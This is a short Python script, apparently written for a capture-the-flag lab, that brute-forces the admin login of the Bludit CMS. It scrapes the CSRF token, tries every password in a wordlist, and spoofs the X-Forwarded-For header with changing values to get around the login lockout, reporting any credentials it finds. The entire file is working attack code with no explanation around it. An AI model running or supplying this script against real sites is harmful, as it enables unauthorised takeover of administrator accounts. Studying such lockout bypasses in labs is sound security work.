import requests, re


def password_bruteforce(username, target, wordlist):
    file = open(wordlist).readlines()
    passwd = ''

    for password, num in zip(file, range(len(file))):
        try:
            session = requests.Session()
            bludit_login = session.get(target)
            get_csrf_token = re.search(r'tokenCSRF" value="(.*?)"', str(bludit_login.text)).group(1)

            headers = {'X-Forwarded-For': str(num), 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36', 'Referer': "http://10.10.10.191/admin/"}
            data = {'tokenCSRF': get_csrf_token, 'username': username, 'password': password.strip()}

            send_data = session.post(target, headers=headers, data=data, allow_redirects=False)

            print(f"[ * ] Tried: {password.strip()}")
            if 'location' in send_data.headers:
                if '/admin/dashboard' in send_data.headers['location']:
                    print(f"[ + ] Creds found: {username}:{password.strip()}")
                    passwd += password.strip()
                    break

        except:
            pass
    return passwd

print(password_bruteforce('admin', 'http://127.0.0.1/admin/', 'wordlist.txt'))
